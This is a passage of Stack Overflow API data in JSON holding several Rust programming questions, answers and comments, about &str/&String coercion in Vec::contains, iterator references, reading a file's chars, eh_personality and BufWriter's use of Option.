"post_id": 48985924, "comment_id": 84977187, "body": "<a href=\"https://github.com/rust-lang/rust/issues/42671\" rel=\"nofollow noreferrer\">Vec::contains is too restrictive</a> is also relevant. The short of it is, fixing this so contains can make the comparable references is possible, but it broke other code. A very Rust gotcha."}, {"owner": {"reputation": 316, "user_id": 3432369, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/JzCgi.jpg?s=128&g=1", "display_name": "Nikolay Lebedev", "link": "https://stackoverflow.com/users/3432369/nikolay-lebedev"}, "edited": false, "score": 2, "creation_date": 1519642390, "post_id": 48985924, "comment_id": 84977948, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/24158114/what-are-the-differences-between-rusts-string-and-str\">What are the differences between Rust&#39;s `String` and `str`?</a>"}, {"owner": {"reputation": 2731, "user_id": 109414, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/2b68fe77303968e573ca1e7004462ae7?s=128&d=identicon&r=PG", "display_name": "Edd Barrett", "link": "https://stackoverflow.com/users/109414/edd-barrett"}, "edited": false, "score": 0, "creation_date": 1519642832, "post_id": 48985924, "comment_id": 84978235, "body": "I think it&#39;s more subtle than that. We know the difference between <code>String</code> and <code>str</code>. It&#39;s a question of coercion."}, {"owner": {"reputation": 3418, "user_id": 2835286, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/357f94482ec908e87bbc8055feaa88d0?s=128&d=identicon&r=PG&f=1", "display_name": "Marko Popovic", "link": "https://stackoverflow.com/users/2835286/marko-popovic"}, "edited": false, "score": 0, "creation_date": 1519643856, "post_id": 48985924, "comment_id": 84978928, "body": "@EddBarrett I think that my answer clearly clarifies why it does not make sense for <code>str</code> to coerce to <code>String</code>, and also how you could change your code to avoid allocation."}, {"owner": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 0, "creation_date": 1519656191, "post_id": 48985924, "comment_id": 84986745, "body": "<i>I don&#39;t think the possible duplicate answers my question</i> \u2014 if you spend more time having a useful, distinctive title, false duplicates will be less common."}, {"owner": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 0, "creation_date": 1519656438, "post_id": 48985924, "comment_id": 84986925, "body": "Note that <a href=\"https://play.rust-lang.org/?gist=b65a8ea4d0c788f8c861503a6ce11001&amp;version=stable\" rel=\"nofollow noreferrer\">the function has nothing to do with the problem</a>."}, {"owner": {"reputation": 2731, "user_id": 109414, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/2b68fe77303968e573ca1e7004462ae7?s=128&d=identicon&r=PG", "display_name": "Edd Barrett", "link": "https://stackoverflow.com/users/109414/edd-barrett"}, "edited": false, "score": 0, "creation_date": 1519657129, "post_id": 48985924, "comment_id": 84987369, "body": "We&#39;ve just found <a href=\"https://github.com/rust-lang/rust/issues/42671\" rel=\"nofollow noreferrer\">github.com/rust-lang/rust/issues/42671</a>"}], "answers": [{"comments": [{"owner": {"reputation": 2731, "user_id": 109414, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/2b68fe77303968e573ca1e7004462ae7?s=128&d=identicon&r=PG", "display_name": "Edd Barrett", "link": "https://stackoverflow.com/users/109414/edd-barrett"}, "edited": false, "score": 0, "creation_date": 1519642034, "post_id": 48986577, "comment_id": 84977729, "body": "I don&#39;t think this quite answers my question. Both <code>&amp;str</code> and <code>&amp;String</code> are borrowed types."}, {"owner": {"reputation": 3418, "user_id": 2835286, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/357f94482ec908e87bbc8055feaa88d0?s=128&d=identicon&r=PG&f=1", "display_name": "Marko Popovic", "link": "https://stackoverflow.com/users/2835286/marko-popovic"}, "reply_to_user": {"reputation": 2731, "user_id": 109414, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/2b68fe77303968e573ca1e7004462ae7?s=128&d=identicon&r=PG", "display_name": "Edd Barrett", "link": "https://stackoverflow.com/users/109414/edd-barrett"}, "edited": false, "score": 0, "creation_date": 1519642478, "post_id": 48986577, "comment_id": 84978001, "body": "@EddBarrett You are right. I hope the edited answer now answers your question."}], "tags": [], "owner": {"reputation": 3418, "user_id": 2835286, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/357f94482ec908e87bbc8055feaa88d0?s=128&d=identicon&r=PG&f=1", "display_name": "Marko Popovic", "link": "https://stackoverflow.com/users/2835286/marko-popovic"}, "is_accepted": false, "score": 3, "last_activity_date": 1519642415, "last_edit_date": 1519642415, "creation_date": 1519641789, "answer_id": 48986577, "question_id": 48985924, "link": "https://stackoverflow.com/questions/48985924/why-does-a-str-not-coerce-to-a-string-when-using-veccontains/48986577#48986577", "title": "Why does a &amp;str not coerce to a &amp;String when using Vec::contains?", "body": "<p><code>std::string::String</code> is a growable, heap-allocated data structure whereas string slice (<code>str</code>) is an immutable fixed-length string somewhere in memory. String slice is used as a borrowed type, via <code>&amp;str</code>. Consider it as view to some string date that resides somewhere in memory. That is why it does not make sense for <code>str</code> to coerce to <code>String</code>, while the other way around perfectly makes sense. You have a heap-allocated <code>String</code> somewhere in memory and you want to use a view (a string slice) to that string.</p>\n\n<p>To answer your second question. There is no way to make the code work in the current form. You either need to change to a vector of string slices (that way, there will be no extra allocation) or use something other then <code>contains</code> method.</p>\n"}, {"comments": [{"owner": {"reputation": 2731, "user_id": 109414, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/2b68fe77303968e573ca1e7004462ae7?s=128&d=identicon&r=PG", "display_name": "Edd Barrett", "link": "https://stackoverflow.com/users/109414/edd-barrett"}, "edited": false, "score": 0, "creation_date": 1519642134, "post_id": 48986650, "comment_id": 84977790, "body": "It&#39;s true that you have worked around the issue, but that&#39;s not quite what I meant. Can you do it still using <code>contains</code>?"}, {"owner": {"reputation": 9345, "user_id": 1021920, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/VukgG.jpg?s=128&g=1", "display_name": "hellow", "link": "https://stackoverflow.com/users/1021920/hellow"}, "reply_to_user": {"reputation": 2731, "user_id": 109414, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/2b68fe77303968e573ca1e7004462ae7?s=128&d=identicon&r=PG", "display_name": "Edd Barrett", "link": "https://stackoverflow.com/users/109414/edd-barrett"}, "edited": false, "score": 0, "creation_date": 1519642185, "post_id": 48986650, "comment_id": 84977820, "body": "I&#39;m afraid no, but what&#39;s the difference in your eyes? Both do the same :)"}, {"owner": {"reputation": 2731, "user_id": 109414, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/2b68fe77303968e573ca1e7004462ae7?s=128&d=identicon&r=PG", "display_name": "Edd Barrett", "link": "https://stackoverflow.com/users/109414/edd-barrett"}, "edited": false, "score": 0, "creation_date": 1519642453, "post_id": 48986650, "comment_id": 84977988, "body": "Practically you are right, but it doesn&#39;t help me understand the type system restrictions at play here."}, {"owner": {"reputation": 9345, "user_id": 1021920, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/VukgG.jpg?s=128&g=1", "display_name": "hellow", "link": "https://stackoverflow.com/users/1021920/hellow"}, "reply_to_user": {"reputation": 2731, "user_id": 109414, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/2b68fe77303968e573ca1e7004462ae7?s=128&d=identicon&r=PG", "display_name": "Edd Barrett", "link": "https://stackoverflow.com/users/109414/edd-barrett"}, "edited": false, "score": 0, "creation_date": 1519642576, "post_id": 48986650, "comment_id": 84978067, "body": "Ok, but your question was: <code>Is there a way to make the code work without the extra allocation?</code> I answered that, I get a downvote? Okay :/ Go on"}, {"owner": {"reputation": 2731, "user_id": 109414, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/2b68fe77303968e573ca1e7004462ae7?s=128&d=identicon&r=PG", "display_name": "Edd Barrett", "link": "https://stackoverflow.com/users/109414/edd-barrett"}, "edited": false, "score": 0, "creation_date": 1519642668, "post_id": 48986650, "comment_id": 84978133, "body": "FWIW it wasn&#39;t me who downvoted. I&#39;ll revise my question to be more clear."}, {"owner": {"reputation": 9345, "user_id": 1021920, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/VukgG.jpg?s=128&g=1", "display_name": "hellow", "link": "https://stackoverflow.com/users/1021920/hellow"}, "reply_to_user": {"reputation": 2731, "user_id": 109414, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/2b68fe77303968e573ca1e7004462ae7?s=128&d=identicon&r=PG", "display_name": "Edd Barrett", "link": "https://stackoverflow.com/users/109414/edd-barrett"}, "edited": false, "score": 0, "creation_date": 1519642728, "post_id": 48986650, "comment_id": 84978165, "body": "Ok, sorry for the imputation. :)"}], "tags": [], "owner": {"reputation": 9345, "user_id": 1021920, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/VukgG.jpg?s=128&g=1", "display_name": "hellow", "link": "https://stackoverflow.com/users/1021920/hellow"}, "is_accepted": false, "score": 6, "last_activity_date": 1519642827, "last_edit_date": 1519642827, "creation_date": 1519642009, "answer_id": 48986650, "question_id": 48985924, "link": "https://stackoverflow.com/questions/48985924/why-does-a-str-not-coerce-to-a-string-when-using-veccontains/48986650#48986650", "title": "Why does a &amp;str not coerce to a &amp;String when using Vec::contains?", "body": "<p>Your first question should be answer already by @Marko.</p>\n\n<p>Your second question, should be easy to answer as well, just use a closure:</p>\n\n<p><code>let ret = l.iter().any(|x| x == func());</code></p>\n\n<h2>Edit:</h2>\n\n<p>Not the \"real\" answer anymore, but I let this here for people who might be interested in a solution for this.</p>\n"}, {"tags": [], "owner": {"reputation": 2731, "user_id": 109414, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/2b68fe77303968e573ca1e7004462ae7?s=128&d=identicon&r=PG", "display_name": "Edd Barrett", "link": "https://stackoverflow.com/users/109414/edd-barrett"}, "is_accepted": true, "score": 0, "last_activity_date": 1519918626, "last_edit_date": 1519918626, "creation_date": 1519911491, "answer_id": 49050907, "question_id": 48985924, "link": "https://stackoverflow.com/questions/48985924/why-does-a-str-not-coerce-to-a-string-when-using-veccontains/49050907#49050907", "title": "Why does a &amp;str not coerce to a &amp;String when using Vec::contains?", "body": "<p>It seems that the Rust developers <a href=\"https://github.com/rust-lang/rust/issues/42671\" rel=\"nofollow noreferrer\">intend to adjust the signature of <code>contains</code> to allow the example posted above to work</a>.</p>\n\n<p>In some sense, this is a known bug in <code>contains</code>. It sounds like the fix won't allow those types to coerce, but will allow the above example to work.</p>\n"}], "owner": {"reputation": 2731, "user_id": 109414, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/2b68fe77303968e573ca1e7004462ae7?s=128&d=identicon&r=PG", "display_name": "Edd Barrett", "link": "https://stackoverflow.com/users/109414/edd-barrett"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 861, "favorite_count": 0, "accepted_answer_id": 49050907, "answer_count": 3, "score": 8, "last_activity_date": 1519918626, "creation_date": 1519639803, "last_edit_date": 1519656296, "question_id": 48985924, "link": "https://stackoverflow.com/questions/48985924/why-does-a-str-not-coerce-to-a-string-when-using-veccontains", "title": "Why does a &amp;str not coerce to a &amp;String when using Vec::contains?", "body": "<p>A friend asked me to explain the following quirk in Rust. I was unable to, hence this question:</p>\n\n<pre><code>fn main() {\n    let l: Vec&lt;String&gt; = Vec::new();\n    //let ret = l.contains(&amp;String::from(func())); // works\n    let ret = l.contains(func());  // does not work\n    println!(\"ret: {}\", ret);\n}\n\nfn func() -&gt; &amp; 'static str {\n    \"hello\"\n}\n</code></pre>\n\n<p><a href=\"https://play.rust-lang.org/?gist=de5aa44b610d166c2a55fb9f8910099a&amp;version=stable\" rel=\"noreferrer\">Example on the Rust Playground</a></p>\n\n<p>The compiler will complain like this:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>error[E0308]: mismatched types\n --&gt; src/main.rs:4:26\n  |\n4 |     let ret = l.contains(func());  // does not work\n  |                          ^^^^^^ expected struct `std::string::String`, found str\n  |\n  = note: expected type `&amp;std::string::String`\n             found type `&amp;'static str`\n</code></pre>\n\n<p>In other words, <code>&amp;str</code> does not coerce with <code>&amp;String</code>.</p>\n\n<p>At first I thought it was to do with <code>'static</code>, however that is a red herring.</p>\n\n<p>The commented line fixes the example at the cost of an extra allocation.</p>\n\n<p>My questions:</p>\n\n<ul>\n<li>Why doesn't <code>&amp;str</code> coerce with <code>&amp;String</code>?</li>\n<li>Is there a way to make the call to <code>contains</code> work without the extra allocation?</li>\n</ul>\n"}, {"tags": ["vector", "reference", "rust", "mapping"], "comments": [{"owner": {"reputation": 19105, "user_id": 3005167, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/t0bMQ.png?s=128&g=1", "display_name": "kazemakase", "link": "https://stackoverflow.com/users/3005167/kazemakase"}, "edited": false, "score": 1, "creation_date": 1519641098, "post_id": 48985903, "comment_id": 84977087, "body": "Reference to items are what you get when iterating over a slice. You don&#39;t want the for loop to move the values out of the vector, right? (Otherwise you would use <code>drain()</code>) Of course you can tell the closure to expect a reference: <code>v.iter().map(|&amp;x| {</code>."}, {"owner": {"reputation": 437, "user_id": 6514903, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/316d49ecdc43dc3721b4081db48197e6?s=128&d=identicon&r=PG&f=1", "display_name": "Bibek Shah", "link": "https://stackoverflow.com/users/6514903/bibek-shah"}, "reply_to_user": {"reputation": 19105, "user_id": 3005167, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/t0bMQ.png?s=128&g=1", "display_name": "kazemakase", "link": "https://stackoverflow.com/users/3005167/kazemakase"}, "edited": false, "score": 0, "creation_date": 1519641664, "post_id": 48985903, "comment_id": 84977460, "body": "Thanks, I must have skipped it while reading."}, {"owner": {"reputation": 9345, "user_id": 1021920, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/VukgG.jpg?s=128&g=1", "display_name": "hellow", "link": "https://stackoverflow.com/users/1021920/hellow"}, "reply_to_user": {"reputation": 19105, "user_id": 3005167, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/t0bMQ.png?s=128&g=1", "display_name": "kazemakase", "link": "https://stackoverflow.com/users/3005167/kazemakase"}, "edited": false, "score": 2, "creation_date": 1519642134, "post_id": 48985903, "comment_id": 84977791, "body": "@kazemakase make it an answer, not a comment ;)"}, {"owner": {"reputation": 19105, "user_id": 3005167, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/t0bMQ.png?s=128&g=1", "display_name": "kazemakase", "link": "https://stackoverflow.com/users/3005167/kazemakase"}, "reply_to_user": {"reputation": 9345, "user_id": 1021920, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/VukgG.jpg?s=128&g=1", "display_name": "hellow", "link": "https://stackoverflow.com/users/1021920/hellow"}, "edited": false, "score": 0, "creation_date": 1519646617, "post_id": 48985903, "comment_id": 84980673, "body": "@hellow If there is no time I comment instead and answer later if nobody else does so in the meantime :)"}], "answers": [{"tags": [], "owner": {"reputation": 19105, "user_id": 3005167, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/t0bMQ.png?s=128&g=1", "display_name": "kazemakase", "link": "https://stackoverflow.com/users/3005167/kazemakase"}, "is_accepted": true, "score": 5, "last_activity_date": 1603351336, "last_edit_date": 1603351336, "creation_date": 1519646449, "answer_id": 48988056, "question_id": 48985903, "link": "https://stackoverflow.com/questions/48985903/why-does-iterating-a-vector-of-i32s-give-references-to-i32-i32/48988056#48988056", "title": "Why does iterating a vector of i32s give references to i32 (&amp;i32)?", "body": "<p>Calling the <a href=\"https://doc.rust-lang.org/std/vec/struct.Vec.html#method.iter\" rel=\"nofollow noreferrer\"><code>.iter()</code></a> method on a vector returns an iterator over references the vector's elements. Otherwise, it would have to move or copy the elements out of the vector, which is not desirable in the general case <sup>[1]</sup>. In the documentation this is not immediately obvious from the declaration:</p>\n<pre><code>pub fn iter(&amp;self) -&gt; Iter&lt;T&gt;  // Return type does not look like a reference\n</code></pre>\n<p>However, the examples show that you get a reference:</p>\n<pre><code>assert_eq!(iterator.next(), Some(&amp;1));  // note the `&amp;1` instead of just `1`\n</code></pre>\n<p>The closure can be instructed to dereference the parameter:</p>\n<pre><code>v.iter().map(|&amp;x| { /* do something */ })\n</code></pre>\n<p>This is fine if the vector contains <code>Copy</code>able types like <code>i32</code>. Otherwise this would result in a <em>cannot move out of borrowed content</em> error. In this case you will likely want to work with a reference anyway.</p>\n<p>If you no longer need the vector after iterating you can use <code>.into_iter()</code>, which consumes the vector and iterates over owned items instead of references.</p>\n<p><sub>[1] Moving would clear the vector, which is covered by the <a href=\"https://doc.rust-lang.org/std/vec/struct.Vec.html#method.drain\" rel=\"nofollow noreferrer\"><code>.drain()</code></a> method, and copying is not possible/efficient on all types.</sub></p>\n"}, {"tags": [], "owner": {"reputation": 25137, "user_id": 4498831, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/jDBV2.png?s=128&g=1", "display_name": "Boiethios", "link": "https://stackoverflow.com/users/4498831/boiethios"}, "is_accepted": false, "score": 2, "last_activity_date": 1519650274, "creation_date": 1519650274, "answer_id": 48989220, "question_id": 48985903, "link": "https://stackoverflow.com/questions/48985903/why-does-iterating-a-vector-of-i32s-give-references-to-i32-i32/48989220#48989220", "title": "Why does iterating a vector of i32s give references to i32 (&amp;i32)?", "body": "<p>If you want to consume the <code>Vec</code>, you must use <code>into_iter()</code> method:</p>\n\n<pre><code>use std::io;\n\nfn main() {\n    let mut in0 = String::new();\n    io::stdin().read_line(&amp;mut in0).expect(\"stdin err\");\n    let n: i32 = in0.trim().parse().expect(\"parse err\");\n    println!(\"{}\", n);\n    let mut v: Vec&lt;i32&gt; = Vec::new();\n    for _ in 0 .. n {\n        let mut inp = String::new();\n        io::stdin().read_line(&amp;mut inp).expect(\"stdin err\");\n        let num: i32 = inp.trim().parse().unwrap();\n        v.push(num);\n    }\n    let out: Vec&lt;_&gt; = v.into_iter().map(|x| {\n        if x &lt; 38 {\n            x\n        } else if x % 5 &gt; 3 {\n            x + x % 5\n        } else {\n            x\n        }\n    }).collect();\n    println!(\"{:?}\", out);\n}\n</code></pre>\n\n<p>If you do not consume the vector, the things inside it can only be borrowed, not moved.</p>\n"}], "owner": {"reputation": 437, "user_id": 6514903, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/316d49ecdc43dc3721b4081db48197e6?s=128&d=identicon&r=PG&f=1", "display_name": "Bibek Shah", "link": "https://stackoverflow.com/users/6514903/bibek-shah"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1341, "favorite_count": 1, "accepted_answer_id": 48988056, "answer_count": 2, "score": 3, "last_activity_date": 1603351336, "creation_date": 1519639737, "last_edit_date": 1593538887, "question_id": 48985903, "link": "https://stackoverflow.com/questions/48985903/why-does-iterating-a-vector-of-i32s-give-references-to-i32-i32", "title": "Why does iterating a vector of i32s give references to i32 (&amp;i32)?", "body": "<p>The following program tries to grade the marks of a student:</p>\n<pre><code>use std::io;\n\nfn main() {\n    let mut in0 = String::new();\n    io::stdin().read_line(&amp;mut in0).expect(&quot;stdin err&quot;);\n    let n: i32 = in0.trim().parse().expect(&quot;parse err&quot;);\n    println!(&quot;{}&quot;, n);\n    let mut v: Vec&lt;i32&gt; = Vec::new();\n    for _ in 0..n {\n        let mut inp = String::new();\n        io::stdin().read_line(&amp;mut inp).expect(&quot;stdin err&quot;);\n        let num: i32 = inp.trim().parse().unwrap();\n        v.push(num);\n    }\n    let out: Vec&lt;_&gt; = v\n        .iter()\n        .map(|x| {\n            if x &lt; 38 {\n                x\n            } else if x % 5 &gt; 3 {\n                x + x % 5\n            } else {\n                x\n            }\n        })\n        .collect();\n    println!(&quot;{:?}&quot;, v);\n}\n</code></pre>\n<p>While compiling, I get the following error.</p>\n<pre class=\"lang-none prettyprint-override\"><code>error[E0308]: mismatched types\n  --&gt; src/main.rs:19:20\n   |\n19 |             if x &lt; 38 {\n   |                    ^^\n   |                    |\n   |                    expected `&amp;i32`, found integer\n   |                    help: consider borrowing here: `&amp;38`\n\nerror[E0308]: `if` and `else` have incompatible types\n  --&gt; src/main.rs:24:17\n   |\n21 |               } else if x % 5 &gt; 3 {\n   |  ____________________-\n22 | |                 x + x % 5\n   | |                 --------- expected because of this\n23 | |             } else {\n24 | |                 x\n   | |                 ^ expected `i32`, found `&amp;i32`\n25 | |             }\n   | |_____________- `if` and `else` have incompatible types\n   |\nhelp: consider dereferencing the borrow\n   |\n23 |             } else *{\n24 |                 x\n25 |             }\n</code></pre>\n<p>How is the <code>x</code> variable a <code>&amp;i32</code> type and not a <code>i32</code> type?</p>\n"}, {"tags": ["file", "iterator", "rust"], "owner": {"reputation": 5523, "user_id": 22610, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/7f9987de99a6e76e6f7cb631158c0b1f?s=128&d=identicon&r=PG", "display_name": "Andy Balaam", "link": "https://stackoverflow.com/users/22610/andy-balaam"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 742, "favorite_count": 1, "closed_date": 1519656089, "answer_count": 0, "score": 1, "last_activity_date": 1519669892, "creation_date": 1519633188, "last_edit_date": 1519666114, "question_id": 48984097, "link": "https://stackoverflow.com/questions/48984097/how-to-iterate-over-the-chars-in-a-file", "closed_reason": "Duplicate", "title": "How to iterate over the chars in a file", "body": "<p>Related: <a href=\"https://stackoverflow.com/questions/35385703/read-file-character-by-character-in-rust\">Read file character-by-character in Rust</a>, but the answers there do not address the question of how to produce an <code>Iterator</code> that yields the characters in a file.</p>\n\n<p>I am writing a function with a signature like this:</p>\n\n<pre><code>fn lex(chars: Iterator&lt;Item=char&gt;) -&gt; Tokens {\n}\n</code></pre>\n\n<p>that takes in an iterator of <code>char</code>s, and returns another iterator.</p>\n\n<p>I want to be able to write tests for this function, e.g. by passing in the result of calling <code>chars()</code> on a string object.</p>\n\n<p>In my product, on the code, I want to read a text file and pass the characters in that file in to my function.  For the moment, I don't care what happens if the file is not valid UTF-8.</p>\n\n<p>I would be happy to change the signature of the function, e.g. to take in an <code>Iterator&lt;Item=Result&lt;char, SomeErrorType&gt;&gt;</code>, but I do want to consume the file on demand, not read the whole thing in beforehand.</p>\n\n<p>I would be happy to use a <code>BufRead</code> and an <code>io::Cursor</code> in test if that helped.</p>\n\n<p>I looked at calling <code>chars()</code> on a <a href=\"https://github.com/rust-lang/rust/issues/27802\" rel=\"nofollow noreferrer\"><code>Read</code></a> but it is unstable and looks like it will never become stable.</p>\n\n<p>So, how do I iterate over the characters in a file?</p>\n"}, {"tags": ["rust"], "answers": [{"tags": [], "owner": {"reputation": 4594, "user_id": 1478356, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/996ee463b8f6b17a738f2e23f7ecfe9f?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/1478356/stefan"}, "is_accepted": true, "score": 10, "last_activity_date": 1519633485, "creation_date": 1519633485, "answer_id": 48984171, "question_id": 48982154, "link": "https://stackoverflow.com/questions/48982154/where-is-eh-personality-called/48984171#48984171", "title": "Where is eh_personality called?", "body": "<p>See <a href=\"https://doc.rust-lang.org/beta/unstable-book/language-features/lang-items.html#more-about-the-language-items\" rel=\"noreferrer\">unstable-book: lang_items</a>:</p>\n\n<blockquote>\n  <p>The first of these functions, <code>rust_eh_personality</code>, is used by the failure mechanisms of the compiler. This is often mapped to GCC's personality function (see the libstd implementation for more information), but crates which do not trigger a panic can be assured that this function is never called. The language item's name is <code>eh_personality</code>.</p>\n</blockquote>\n\n<p>As far as I can tell it is required to create unwind information; if you abort or loop in the <code>panic_fmt</code> language item (function <code>rust_begin_unwind</code>) it probably doesn't get called.</p>\n\n<p>Also see the internal comments in <a href=\"https://github.com/rust-lang/rust/blob/master/src/libpanic_abort/lib.rs\" rel=\"noreferrer\">libpanic_abort/lib.rs</a>.</p>\n\n<p>If you search for <a href=\"https://github.com/rust-lang/rust/search?p=2&amp;q=rust_eh_personality\" rel=\"noreferrer\"><code>rust_eh_personality</code></a> you'll find a usage in <a href=\"https://github.com/rust-lang/rust/blob/9af374abf9d41c533afa46e62e1047097c190445/src/librustc_trans/context.rs#L350\" rel=\"noreferrer\">librustc_trans/context.rs: <code>CodegenCx::eh_personality</code></a>.  Searching for <a href=\"https://github.com/rust-lang/rust/search?q=eh_personality\" rel=\"noreferrer\"><code>eh_personality</code></a> should reveal the places this function is called.  (It is used for code generation, not a direct call.)</p>\n\n<p>Searching for <code>#[lang = \"eh_personality\"]</code> only shows the places where a personality is defined, not the usage.</p>\n"}], "owner": {"reputation": 2684, "user_id": 3171100, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/457ebc3fdf64f6b24e968e3d6a1316db?s=128&d=identicon&r=PG", "display_name": "Chris Smith", "link": "https://stackoverflow.com/users/3171100/chris-smith"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 3533, "favorite_count": 1, "accepted_answer_id": 48984171, "answer_count": 1, "score": 11, "last_activity_date": 1519656037, "creation_date": 1519624001, "last_edit_date": 1519656037, "question_id": 48982154, "link": "https://stackoverflow.com/questions/48982154/where-is-eh-personality-called", "title": "Where is eh_personality called?", "body": "<p>I'm trying to implement an OS in Rust using libcore. In the documentation, <a href=\"https://doc.rust-lang.org/core/\" rel=\"noreferrer\">it says that the <code>eh_personality</code> function needs to be implemented</a>.</p>\n\n<p>However, <a href=\"https://github.com/rust-lang/rust/search?p=1&amp;q=%22%23%5Blang+%3D+%22eh_personality%22%5D%22&amp;type=&amp;utf8=%E2%9C%93\" rel=\"noreferrer\">I see no usage of this function in libcore itself</a> and I am able to compile, run, and execute panics without it.</p>\n\n<p>Is there something I'm missing here? Where does <code>eh_personality</code> get called during the <code>panic!()</code> cycle?</p>\n"}, {"tags": ["rust"], "answers": [{"comments": [{"owner": {"reputation": 858, "user_id": 3750062, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/097546a539804f0e62654904c546831a?s=128&d=identicon&r=PG&f=1", "display_name": "HeroicKatora", "link": "https://stackoverflow.com/users/3750062/heroickatora"}, "edited": false, "score": 0, "creation_date": 1519609212, "post_id": 48980293, "comment_id": 84965740, "body": "I hadn&#39;t thought of that. Could you use the Option to protect against the panic as well then? I.e. instead of <code>self.panicked = true</code>, temporarily <code>take</code> the inner writer and give it back afterwards."}, {"owner": {"reputation": 46065, "user_id": 234590, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/463c0219a51a5d1fd08e1fa280811b57?s=128&d=identicon&r=PG", "display_name": "Francis Gagn&#233;", "link": "https://stackoverflow.com/users/234590/francis-gagn%c3%a9"}, "reply_to_user": {"reputation": 858, "user_id": 3750062, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/097546a539804f0e62654904c546831a?s=128&d=identicon&r=PG&f=1", "display_name": "HeroicKatora", "link": "https://stackoverflow.com/users/3750062/heroickatora"}, "edited": false, "score": 0, "creation_date": 1519610772, "post_id": 48980293, "comment_id": 84966056, "body": "@HeroicKatora I think so, but it might be slightly more costly because it would involve making two (shallow) copies of <code>W</code> (whose size we have no idea of). The <code>panicked</code> field, on the other hand, is one byte long, so it&#39;s a known, small, fixed cost."}, {"owner": {"reputation": 4594, "user_id": 1478356, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/996ee463b8f6b17a738f2e23f7ecfe9f?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/1478356/stefan"}, "edited": false, "score": 2, "creation_date": 1519631601, "post_id": 48980293, "comment_id": 84972091, "body": "Related: <a href=\"https://github.com/rust-lang/rfcs/pull/2061\" rel=\"nofollow noreferrer\">RFC 2061: Destructure drop structs</a> was closed as <code>postponed</code> some days ago."}, {"owner": {"reputation": 2645, "user_id": 5254193, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-PTHapBqhSQM/AAAAAAAAAAI/AAAAAAAABA4/r5mrExVuDgU/photo.jpg?sz=128", "display_name": "Masaki Hara", "link": "https://stackoverflow.com/users/5254193/masaki-hara"}, "edited": false, "score": 0, "creation_date": 1519725652, "post_id": 48980293, "comment_id": 85016211, "body": "<a href=\"https://github.com/rust-lang/rust/pull/36336\" rel=\"nofollow noreferrer\">PR #36336</a> is also related."}], "tags": [], "owner": {"reputation": 46065, "user_id": 234590, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/463c0219a51a5d1fd08e1fa280811b57?s=128&d=identicon&r=PG", "display_name": "Francis Gagn&#233;", "link": "https://stackoverflow.com/users/234590/francis-gagn%c3%a9"}, "is_accepted": true, "score": 4, "last_activity_date": 1519608900, "creation_date": 1519608900, "answer_id": 48980293, "question_id": 48980186, "link": "https://stackoverflow.com/questions/48980186/why-does-bufwriter-wrap-the-inner-write-in-an-option/48980293#48980293", "title": "Why does BufWriter wrap the inner Write in an Option?", "body": "<p>The reason is simple: <code>BufWriter</code> implements 